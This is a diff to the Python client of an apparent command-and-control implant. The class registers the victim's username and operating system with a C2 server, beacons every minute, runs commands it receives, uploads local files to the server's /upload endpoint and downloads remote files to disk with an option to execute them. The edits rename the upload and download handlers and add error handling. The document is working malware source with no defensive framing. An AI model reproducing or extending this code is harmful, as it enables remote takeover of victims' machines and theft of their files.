@@ -19,19 +19,23 @@ class C2Client:
     
     def register(self):
         url = f"{self.server_url}/register"
-        username = getpass.getuser()
+        
+        try:
+            username = getpass.getuser()
 
-        if not self.client_id:
-            payload = {"username": username, "client_id": "", "op_system": os.name}
-            response = requests.post(url, json=payload)
-            self.client_id = response.json().get("client_id")
-            
-            with open(self.key_file_path, "w") as f:
-                f.write(self.client_id)
-            
-            print(response.json())
-        else:
-            print(f"Using existing client ID: {self.client_id}")
+            if not self.client_id:
+                payload = {"username": username, "client_id": "", "op_system": os.name}
+                response = requests.post(url, json=payload)
+                self.client_id = response.json().get("client_id")
+                
+                with open(self.key_file_path, "w") as f:
+                    f.write(self.client_id)
+                
+                print(response.json())
+            else:
+                print(f"Using existing client ID: {self.client_id}")
+        except Exception:
+            raise Exception
 
     def get_key_dir(self):
         if os.name == 'nt':
@@ -54,7 +58,7 @@ class C2Client:
         print(response.json())
 
     def run(self):
-        self.register()
+        self.register()    
         while True:
             self.beacon()
             time.sleep(60) # Timeout before next beacon call
@@ -67,14 +71,14 @@ class C2Client:
                     self.handle_cmd_operation(resource)
                 case "IMP":
                     self.handle_imp_operation(resource)
-                case "FDL":
-                    key = op.get("fdl_key")
-                    self.handle_fdl_operation(resource, key)
                 case "FUP":
+                    key = op.get("fup_key")
+                    self.handle_fup_operation(resource, key)
+                case "FDL":
                     target_dir = op.get("target_dir")
                     execute = op.get("execute")
                     
-                    self.handle_fup_operation(resource, target_dir, execute)
+                    self.handle_fdl_operation(resource, target_dir, execute)
 
     def handle_cmd_operation(self, command):
         cmd_out = ""
@@ -99,19 +103,18 @@ class C2Client:
             
         self.report(status, cmd_out)
     
-    def handle_fdl_operation(self, file_path, key):
+    def handle_fup_operation(self, file_path, key):
         try:         
             if not os.path.exists(file_path):
                 print("Target path not found...")
             else:
                 url = f"{self.server_url}/upload"
                 with open(file_path, "rb") as f:
-                    print("CLIENT-OTK: " + key)
                     payload = {
                         "status": "SUCCESS",
                         "client_id": self.client_id,
                         "file_name": file_path.split("\\")[-1],
-                        "fdl_key": key
+                        "fup_key": key
                     }
                     
                     requests.post(url, data=payload, files={"file": f})
@@ -120,7 +123,7 @@ class C2Client:
         except Exception as e:
             print(str(e))
     
-    def handle_fup_operation(self, resource, target_dir, execute):
+    def handle_fdl_operation(self, resource, target_dir, execute):
         try:
             response = requests.get(resource)
             with open(target_dir, "wb") as f:
